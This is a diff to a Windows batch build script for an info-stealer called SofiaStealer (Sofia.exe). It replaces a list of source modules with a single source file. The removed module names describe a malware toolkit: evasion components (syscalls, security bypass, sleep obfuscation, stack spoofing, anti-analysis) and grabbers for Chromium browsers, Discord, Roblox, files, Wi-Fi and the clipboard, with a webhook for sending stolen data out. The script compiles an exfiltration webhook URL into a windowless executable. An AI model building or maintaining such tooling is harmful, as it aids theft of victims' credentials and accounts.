@@ -70,32 +70,7 @@ echo.
 set SRC=src
 
 :: ── Source files ─────────────────────────────────────────────────
-:: Core stealth engine (NEW)
-set CORE_SOURCES=^
- %SRC%\core\Resolver.cpp ^
- %SRC%\core\Internal.cpp ^
- %SRC%\core\Syscalls.cpp ^
- %SRC%\core\Bypass.cpp ^
- %SRC%\core\SleepObf.cpp ^
- %SRC%\core\StackSpoof.cpp
-
-:: Legacy modules
-set LEGACY_SOURCES=^
- %SRC%\main.cpp ^
- %SRC%\utils\DynamicAPI.cpp ^
- %SRC%\utils\Crypto.cpp ^
- %SRC%\utils\SQLiteHandler.cpp ^
- %SRC%\utils\Impersonator.cpp ^
- %SRC%\utils\AppBound.cpp ^
- %SRC%\modules\AntiAnalysis.cpp ^
- %SRC%\modules\SystemInfo.cpp ^
- %SRC%\modules\Chromium.cpp ^
- %SRC%\modules\Discord.cpp ^
- %SRC%\modules\Roblox.cpp ^
- %SRC%\modules\FileGrabber.cpp ^
- %SRC%\modules\WiFi.cpp ^
- %SRC%\modules\Clipboard.cpp ^
- %SRC%\modules\Webhook.cpp
+set "MAIN_SOURCE=SofiaStealer.cpp"
 
 set "DEBUG_FLAG="
 echo [*] Debug logging DISABLED (Release Only)
@@ -110,9 +85,7 @@ cl.exe ^
   /DSOFIA_WEBHOOK_URL="\"%SOFIA_WEBHOOK_URL%\"" ^
   %DEBUG_FLAG% ^
   /FI"winsock2.h" ^
-  /I"%SRC%" ^
-  /I"%SRC%\core" ^
-  %CORE_SOURCES% %LEGACY_SOURCES% ^
+  %MAIN_SOURCE% ^
   /link ^
     /OUT:Sofia.exe ^
     /SUBSYSTEM:WINDOWS ^
